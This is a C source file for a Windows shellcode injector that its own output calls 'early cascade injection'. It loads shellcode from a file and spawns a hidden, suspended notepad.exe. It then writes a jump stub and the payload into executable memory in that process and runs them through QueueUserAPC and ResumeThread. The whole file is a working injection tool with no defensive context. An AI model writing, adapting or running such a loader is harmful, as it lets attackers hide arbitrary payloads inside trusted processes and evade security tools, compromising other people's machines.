#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

// Simple stub that points to and executes the main shellcode
unsigned char stubCode[] =
"\x48\x31\xC0"                              // xor rax, rax
"\x48\x8B\xC1"                              // mov rax, rcx (main shellcode address passed via RCX)
"\xFF\xE0";                                 // jmp rax (execute the main shellcode)

// Function to read shellcode from a file
unsigned char* ReadShellcode(const char* fileName, size_t* shellcodeSize) {
    FILE* file = nullptr;
    if (fopen_s(&file, fileName, "rb") != 0) {
        fprintf(stderr, "[ERROR] Failed to open shellcode file: %s\n", fileName);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *shellcodeSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(*shellcodeSize);
    if (!buffer) {
        fprintf(stderr, "[ERROR] Memory allocation failed for shellcode\n");
        fclose(file);
        return NULL;
    }

    if (fread(buffer, 1, *shellcodeSize, file) != *shellcodeSize) {
        fprintf(stderr, "[ERROR] Failed to read shellcode from file\n");
        free(buffer);
        fclose(file);
        return NULL;
    }

    fclose(file);
    return buffer;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <shellcode_file>\n", argv[0]);
        return 1;
    }

    size_t shellcodeSize = 0;
    unsigned char* shellcode = ReadShellcode(argv[1], &shellcodeSize);
    if (!shellcode) {
        return 1;
    }

    // Create a suspended process
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[ERROR] CreateProcess failed: %lu\n", GetLastError());
        free(shellcode);
        return 1;
    }

    // Allocate memory for the stub in the target process
    LPVOID remoteStub = VirtualAllocEx(pi.hProcess, NULL, sizeof(stubCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteStub) {
        fprintf(stderr, "[ERROR] VirtualAllocEx for stub failed: %lu\n", GetLastError());
        free(shellcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Write the stub to the target process
    if (!WriteProcessMemory(pi.hProcess, remoteStub, stubCode, sizeof(stubCode), NULL)) {
        fprintf(stderr, "[ERROR] WriteProcessMemory for stub failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteStub, 0, MEM_RELEASE);
        free(shellcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Allocate memory for the main shellcode in the target process
    LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        fprintf(stderr, "[ERROR] VirtualAllocEx for shellcode failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteStub, 0, MEM_RELEASE);
        free(shellcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Write the shellcode to the target process
    if (!WriteProcessMemory(pi.hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        fprintf(stderr, "[ERROR] WriteProcessMemory for shellcode failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, remoteStub, 0, MEM_RELEASE);
        free(shellcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Queue the stub for execution with the address of the main shellcode as an argument
    if (!QueueUserAPC((PAPCFUNC)remoteStub, pi.hThread, (ULONG_PTR)remoteShellcode)) {
        fprintf(stderr, "[ERROR] QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, remoteStub, 0, MEM_RELEASE);
        free(shellcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Resume the thread to trigger execution
    if (ResumeThread(pi.hThread) == -1) {
        fprintf(stderr, "[ERROR] ResumeThread failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, remoteStub, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    printf("[INFO] Early cascade injection executed successfully\n");

    free(shellcode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
